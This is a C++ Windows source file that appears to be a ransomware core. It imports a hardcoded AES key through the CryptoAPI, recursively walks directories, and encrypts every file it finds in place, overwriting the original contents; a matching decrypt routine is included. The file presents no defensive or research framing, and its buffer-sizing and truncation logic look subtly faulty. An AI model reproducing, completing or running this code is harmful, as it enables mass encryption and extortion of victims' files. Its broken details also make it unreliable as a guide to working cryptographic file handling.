#include<iostream>
#include<stdio.h>
#include<Windows.h>
#include<vector>
using namespace std;


vector<BYTE> blob_buffer = { 8, 2, 0, 0, 15, 102, 0, 0, 24, 0, 0, 0, 155, 216, 124, 108, 71, 110, 43, 142, 83, 234, 43, 50, 234, 122, 41, 15, 199, 166, 207, 15, 116, 235, 165, 188 };



void encrypt(LPCWSTR &src_fileName) {
	HANDLE src_file;
	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hCryptKey = NULL;
	cout << "Start Encrypting" << endl;
	if (CryptAcquireContextA(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) == 0) {
		cout << " ERROR during CryptAcquireContextA! Error Code: " << GetLastError() << endl;
	}
	else {
		cout << "A cryptographic provider has been acquired" << endl;
	}
	if (CryptImportKey(hCryptProv, blob_buffer.data(), blob_buffer.size(), 0, 0, &hCryptKey) == 0) {
		cout << "Import failed: " << GetLastError() << endl;
	}
	else {
		printf("Import successful, key is: 0x%x\n", hCryptKey);
	}

	src_file = CreateFileW(src_fileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD fileSize = 0;
	fileSize = GetFileSize(src_file, NULL);
	
	DWORD block_len = 192 * fileSize;
	DWORD buffer_len = 192 * fileSize;
	vector<BYTE>pb_buffer(buffer_len, 0);
	DWORD count = 0;
	int end_of_file = 0;
	cout << "Memory has been allocated for the buffer." << endl;

	//des_file = CreateFileA(des_fileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	SetFilePointer(src_file, 0, NULL, FILE_BEGIN);
	while (end_of_file == 0) {
		if (ReadFile(src_file, pb_buffer.data(), block_len, &count, NULL) == 0) {
			cout << "Error reading " << endl;
			break;
		}
		printf("Count{%d}\n", count);
		if (count < block_len) {
			end_of_file = 1;
		}
		
		if (end_of_file == 1) {
			SetFilePointer(src_file, 0, NULL, FILE_BEGIN);
			if (SetEndOfFile(src_file) == 0) {
				cout << "Error truncating file" << endl;
			}
		}

		if (CryptEncrypt(hCryptKey, 0, end_of_file, 0, pb_buffer.data(), &count, buffer_len) == 0) {
			cout << "Fail to encrypt: " << GetLastError() << endl;;
			break;
		}

		if (WriteFile(src_file, pb_buffer.data(), count, &count, NULL) == 0) {
			printf("Fail to write file\n");
			break;
		}
	}
	CloseHandle(src_file);
	//CloseHandle(des_file);
	CryptDestroyKey(hCryptKey);
	CryptReleaseContext(hCryptProv, 0);
}

void traverse_and_encrypt(wstring path) {
	WIN32_FIND_DATAW findData;
	HANDLE handle = FindFirstFileW((path + L"\\*").c_str(), &findData);
	if (handle == INVALID_HANDLE_VALUE) {
		cout << "Failed to open directory " << path.c_str() << endl;
		return;
	}

	do {
		wstring fileName = findData.cFileName;
		if (fileName == L"." || fileName == L"..") {
			continue;
		}
		wstring fullPath = path + L"\\" + fileName;
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			wcout << "Directory: " << fullPath.c_str() << endl;
			traverse_and_encrypt(fullPath);
		}
		else {
			LPCWSTR encrypt_fileName = fullPath.c_str();
			wcout << "File: " << encrypt_fileName << endl;
			encrypt(encrypt_fileName);
		}
	} while (FindNextFileW(handle, &findData));
	FindClose(handle);
}


void decrypt(HANDLE &src_file, LPCSTR &src_fileName) {
	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hCryptKey = NULL;
	if (CryptAcquireContextA(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) == 0) {
		cout << " ERROR during CryptAcquireContextA! Error Code: " << GetLastError() << endl;
	}
	else {
		cout << "A cryptographic provider has been acquired" << endl;
	}
	if (CryptImportKey(hCryptProv, blob_buffer.data(), blob_buffer.size(), 0, 0, &hCryptKey) == 0) {
		cout << "Import failed: " << GetLastError() << endl;
	}
	else {
		printf("Import successful, key is: 0x%x\n", hCryptKey);
	}
	DWORD block_len = 960;
	DWORD buffer_len = 960;
	vector<BYTE>pb_buffer(buffer_len, 0);
	DWORD count = 0;
	int end_of_file = 0;
	cout << "Memory has been allocated for the buffer." << endl;

	src_file = CreateFileA(src_fileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	//des_file = CreateFileA(des_fileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	while (end_of_file == 0) {
		if (ReadFile(src_file, pb_buffer.data(), block_len, &count, NULL) == 0) {
			cout << "Error reading " << endl;
			break;
		}
		printf("Count{%d}\n", count);
		if (count < block_len) {
			end_of_file = 1;
		}

		if (end_of_file == 1) {
			SetFilePointer(src_file, 0, NULL, FILE_BEGIN);
			if (SetEndOfFile(src_file) == 0) {
				cout << "Error truncated file" << endl;
			}
		}

		if (CryptDecrypt(hCryptKey, 0, end_of_file, 0, pb_buffer.data(), &count) == 0) {
			printf("Failed to decrypt: %d\n", GetLastError());
			break;
		}

		if (WriteFile(src_file, pb_buffer.data(), count, &count, NULL) == 0) {
			printf("Failt to write file\n");
			break;
		}
	}
	CryptDestroyKey(hCryptKey);
	CryptReleaseContext(hCryptProv, 0);
	CloseHandle(src_file);
	//CloseHandle(des_file);
}




